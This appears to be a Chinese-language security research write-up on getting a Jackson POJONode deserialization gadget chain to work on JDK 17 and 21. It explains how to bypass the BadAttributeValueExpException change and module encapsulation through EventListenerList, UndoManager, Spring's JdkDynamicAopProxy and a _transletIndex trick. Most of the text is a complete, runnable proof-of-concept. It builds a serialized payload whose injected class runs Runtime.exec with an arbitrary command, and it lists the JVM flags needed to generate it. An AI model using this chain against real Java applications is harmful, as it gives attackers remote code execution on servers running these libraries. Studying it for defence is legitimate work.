#### 高版本jdk下的突破（jdk17、21复现）

原版的打法是反序列化`BadAttributeValueExpException`时触发`val`属性的`toString`，来触发`POJONode.toString`，使得其调用`TemplatesImpl`的`getOutputProperties`从而动态加载字节码

而在高版本jdk中，`BadAttributeValueExpException`的val属性变成`String`了，无法在反序列化时触发`toString`；`TemplatesImpl`因为模块化的强封装而完全不能使用

##### BadAttributeValueExpException绕过

这个比较简单，触发toString的链的有很多，这里采用`EventListenerList`链来触发`toString`，

链条是`EventListenerList.readObject -> POJONode.toString`，主要是利用字符串与对象的拼接触发

poc如下

```java
javax.swing.event.EventListenerList list = new javax.swing.event.EventListenerList();
UndoManager manager = new UndoManager();
Vector vector = (Vector) getFieldValue(manager.getClass(),manager, "edits");
vector.add(pojoNode);
setValue(list, "listenerList", new Object[]{InternalError.class, manager});
```

##### TemplatesImpl模块化的强封装的绕过

**模块化封装：**

从 JDK 9 开始，Java 引入了 JPMS（Java Platform Module System，模块系统），也就是著名的 Project Jigsaw 。在 JDK 17及以上中，这一机制已经被完全强化，具体体现为：

- 内部 API 封装：以前我们可以随意`import com.sun.*`或者 `sun.*` 的内部类，但在 JDK 17及以上， 这些类已经被模块系统强封装，默认不可访问。
- 强封装机制：模块之间的可见性由 `module-info.java` 描述，如果某个包没有被 `exports` ，外部模块就无法直接访问。
- 反射限制：在 JDK 8 及之前，我们常常通过 `setAccessible(true)` 绕过 `private` 限制，反射 访问类的私有字段或构造函数。但在 JDK 17及以上里，即使你用 `setAccessible(true)` ，也会被 `InaccessibleObjectException` 拦住，除非你在 `JVM` 启动时手动加 `-add-opens` 参数开放 模块或者使用` Java Agent/Instrumentation` 来打破封装。

 

因此，jdk17及以上会进行模块检测导致我们无法直接利用 `getOutputProperties` 。 那么现在最关键的问题，就是如何在jdk高版本之中利用 `getOutputProperties` 

 

###### JdkDynamicAopProxy动态代理TemplatesImpl

在前面的《随机性导致利用失败》中用到一个trick：借助动态代理使用`InvocationHandler`创建`javax.xml.transform.Templates`代理对象，并在`InvocationHandler#invoke`中调用的`TemplatesImpl.getOutputProperties`方法，其中用到的`InvocationHandler`为`org.springframework.aop.framework.JdkDynamicAopProxy`

**查看高版本jdk的 `module-info.java` 描述，可以发现`javax.xml.transform`是`exports`的，因此。直接传入 `TemplatesImpl` 对象的话，`com.sun.org.apache.xalan.internal.xsltc.trax` 没有 export 给外部，所以会出现报错。但是经过`JdkDynamicAopProxy` 代理之后，对外暴露的接口是 `javax.xml.transform.Templates`可以绕过模块化强封装**



在这里需要注意一个很重要的点，在以往我们利用`TemplatesImpl` 的时候，被利用的目标都需要继承 `AbstractTranslet` ，但在高版本下肯定是不行的，因为其在别的包中默认不可访问，必然涉及到模块化的检测导致报错

###### TemplatesImpl恶意类真的必须继承AbstractTranslet？

> - `_transletIndex`：表示哪个 `_bytecodes` 的索引对应“主 translet”类（即执行转换逻辑的那个类）；当 `_transletIndex < 0` 时通常表示没有可执行的 translet。
> - `_auxClasses`：一个容器（`HashMap` / `Hashtable` 等，根据 JDK 与实现不同），用于存放“辅助类”字节码或已经被定义的辅助类引用。

其实不然，`AbstractTranslet`类通过`_transletIndex`来限制执⾏，但 `_transletIndex` 没有被标记为 `transient` 是能参与序列化过程的，可以直接通过反射来绕过这个限制。


当类不继承 `AbstractTranslet` 时，会向 `_auxClasses` 中 `put` 数据，所以需要保证`_auxClasses` 不为空。


寻找实例化 `_auxClasses` 的地方，发现在前⾯有⼀个判断，当 `classCount` ⼤于 1 时，即 `_bytecodes` 传⼊多个类时会将 `_auxClasses` 赋值为 `HashMap`。

最终构造的`TemplatesImpl`恶意类如下:

```java
ClassPool pool = ClassPool.getDefault();
CtClass clazzFoo = pool.makeClass("abu");
byte[] abu = clazzFoo.toBytecode();
// 满⾜条件 1. classCount也就是_bytecodes的数量⼤于1 2. _transletIndex >= 0可去掉 AbstractTranslet
Templates templates = TemplatesImpl.class.newInstance();
setValue(templates, "_bytecodes", new byte[][]{genPayload(cmd),abu});
setValue(templates, "_name", "1");
setValue(templates,"_transletIndex",0);
return templates;
```

最终可在高版本jdk中直接rce的poc如下，下面是jdk17中的测试:

```java
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Vector;

//java9以上 有module限制 生成序列化时需加上--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens=java.desktop/javax.swing.event=ALL-UNNAMED
//链子入口EventListenerList -> UndoManager -> POJONode  ->
public class jackson_rce {
    public static void main(String[] args) throws Exception{

        POJONode pojoNode = new POJONode(makeTemplatesImplAopProxy());
        javax.swing.event.EventListenerList list = new javax.swing.event.EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager.getClass(),manager, "edits");
        vector.add(pojoNode);
        setValue(list, "listenerList", new Object[]{InternalError.class, manager});
        System.out.println(serialize(list));
        unserialize("ser.bin");
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static String serialize(Object o) throws IOException {
        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        os.writeObject(o);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println(base64String.length());
        return base64String;
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
    public static byte[] genPayload(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(52);
        return clazz.toBytecode();
    }
    public static Templates makeTemplatesImpl(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazzFoo = pool.makeClass("abu");
        byte[] abu = clazzFoo.toBytecode();
        // 满⾜条件 1. classCount也就是_bytecodes的数量⼤于1 2. _transletIndex >= 0可去掉 AbstractTranslet
        Templates templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{genPayload(cmd),abu});
        setValue(templates, "_name", "1");
        setValue(templates,"_transletIndex",0);
        return templates;
    }
    public static Object makeTemplatesImplAopProxy() throws Exception {
        Templates templates = makeTemplatesImpl("calc");
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
    public static Object getFieldValue(Class<?> clazz, Object obj, String fieldName) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = (Field) getFieldValue(clazz.getSuperclass(), obj, fieldName);

            return field.get(obj);
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getFieldValue(clazz.getSuperclass(),obj, fieldName);
            }
            throw e;
        }
    }
}
```

生成序列化时候需要开启

```
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens=java.desktop/javax.swing.event=ALL-UNNAMED
```

